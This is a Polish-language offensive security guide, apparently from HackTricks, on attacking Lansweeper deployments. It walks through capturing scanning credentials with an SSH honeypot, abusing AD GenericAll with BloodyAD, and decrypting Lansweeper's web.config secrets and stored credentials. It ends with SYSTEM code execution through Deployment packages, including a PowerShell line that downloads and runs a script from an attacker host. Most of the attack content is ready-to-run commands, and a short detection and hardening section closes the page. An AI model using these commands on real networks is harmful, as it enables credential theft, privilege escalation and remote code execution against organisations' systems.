# Wykorzystanie Lansweeper: pozyskiwanie poświadczeń, odszyfrowywanie sekretów i Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper to platforma do odkrywania i inwentaryzacji zasobów IT powszechnie wdrażana na Windows i zintegrowana z Active Directory. Poświadczenia skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania się na zasobach przez protokoły takie jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często pozwalają na:

- Przechwycenie poświadczeń poprzez przekierowanie celu skanowania na host kontrolowany przez atakującego (honeypot)
- Nadużycie AD ACLs ujawnionych przez grupy związane z Lansweeper w celu uzyskania zdalnego dostępu
- Odszyfrowanie na hoście sekretów skonfigurowanych w Lansweeper (connection strings oraz zapisane scanning credentials)
- Wykonanie kodu na zarządzanych punktach końcowych przez funkcję Deployment (często uruchamianą jako SYSTEM)

Ta strona podsumowuje praktyczne scenariusze atakującego i polecenia do nadużycia tych zachowań podczas engagementów.

## 1) Pozyskiwanie scanning credentials przez honeypot (przykład SSH)

Idea: utwórz Scanning Target wskazujący na twój host i przypisz do niego istniejące Scanning Credentials. Gdy skan się uruchomi, Lansweeper spróbuje uwierzytelnić się za pomocą tych poświadczeń, a twój honeypot je przechwyci.

Przegląd kroków (interfejs webowy):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Skonfiguruj port SSH na coś osiągalnego (np. 2022 jeśli 22 jest zablokowany)
- Wyłącz harmonogram i uruchom skan ręcznie
- Scanning → Scanning Credentials → upewnij się, że istnieją Linux/SSH creds; przypisz je do nowego targetu (włącz wszystkie według potrzeby)
- Kliknij “Scan now” na targetcie
- Uruchom SSH honeypot i pozyskaj próbowaną nazwę użytkownika/hasło

Przykład z sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Zweryfikuj przechwycone poświadczenia względem usług DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notatki
- Działa podobnie dla innych protokołów, gdy możesz zmusić scanner do połączenia się z twoim listenerem (SMB/WinRM honeypots itp.). SSH jest często najprostszy.
- Wiele scannerów identyfikuje się poprzez charakterystyczne banery klienta (np. RebexSSH) i spróbuje wykonać nieszkodliwe polecenia (uname, whoami itp.).

## 2) AD ACL abuse: uzyskaj zdalny dostęp dodając siebie do app-admin group

Użyj BloodHound, aby wyenumerować effective rights z kompromitowanego konta. Częste znalezisko to grupa specyficzna dla scannera lub aplikacji (np. “Lansweeper Discovery”), posiadająca GenericAll nad uprzywilejowaną grupą (np. “Lansweeper Admins”). Jeśli uprzywilejowana grupa jest także członkiem “Remote Management Users”, WinRM staje się dostępny po dodaniu siebie.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll na grupie za pomocą BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Następnie uzyskaj interaktywny shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wskazówka: operacje Kerberos są wrażliwe na czas. Jeśli napotkasz KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Odszyfruj sekrety skonfigurowane przez Lansweeper na hoście

Na serwerze Lansweeper strona ASP.NET zwykle przechowuje zaszyfrowany connection string oraz klucz symetryczny używany przez aplikację. Mając odpowiedni dostęp lokalny, możesz odszyfrować ciąg połączenia DB i następnie wydobyć przechowywane poświadczenia skanowania.

Typowe lokalizacje:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowanie i wydobycie przechowywanych creds:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Oczekiwany wynik zawiera szczegóły połączeń DB oraz plaintext poświadczenia do skanowania, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone uprawnienia lokalne na hostach domenowych:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Wykorzystaj odzyskane Windows scanning creds do uzyskania uprzywilejowanego dostępu:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Jako członek „Lansweeper Admins”, interfejs webowy udostępnia Deployment i Configuration. W sekcji Deployment → Deployment packages możesz tworzyć pakiety, które uruchamiają dowolne polecenia na docelowych zasobach. Wykonanie jest przeprowadzane przez Lansweeper service z wysokimi uprawnieniami, co skutkuje wykonaniem kodu jako NT AUTHORITY\SYSTEM na wybranym hoście.

Główne kroki:
- Utwórz nowy Deployment package, który uruchamia jednowierszowy skrypt PowerShell lub cmd (reverse shell, add-user, itp.).
- Wybierz docelowy zasób (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
- Odbierz swój shell jako SYSTEM.

Przykładowe payloady (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Operacje wdrożeniowe są głośne i pozostawiają wpisy w logach Lansweeper oraz w dziennikach zdarzeń Windows. Używaj rozważnie.

## Wykrywanie i utwardzanie

- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling i anomalne dostępy do udostępnień Lansweeper.
- Kontrole ruchu wychodzącego: blokuj lub ściśle ogranicz ruch wychodzący SSH/SMB/WinRM z hostów skanujących. Generuj alerty przy niestandardowych portach (np. 2022) i nietypowych banerach klienta, takich jak Rebex.
- Chroń `Website\\web.config` oraz `Key\\Encryption.txt`. Przenieś sekrety do vault i rotuj je po ekspozycji. Rozważ konta usługowe z minimalnymi uprawnieniami oraz gMSA tam, gdzie to możliwe.
- Monitorowanie AD: generuj alerty przy zmianach w grupach związanych z Lansweeper (np. “Lansweeper Admins”, “Remote Management Users”) oraz przy zmianach ACL przyznających GenericAll/Write lub umożliwiających modyfikację członkostwa w grupach uprzywilejowanych.
- Audytuj tworzenie/zmiany/wykonywanie pakietów Deployment; generuj alerty dla pakietów uruchamiających cmd.exe/powershell.exe lub nawiązujących nieoczekiwane połączenia wychodzące.

## Powiązane tematy
- SMB/LSA/SAMR enumeration i RID cycling
- Kerberos password spraying i uwzględnienie rozbieżności czasu (clock skew)
- Analiza ścieżek BloodHound dla grup application-admin
- Wykorzystanie WinRM i lateral movement

## Referencje
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
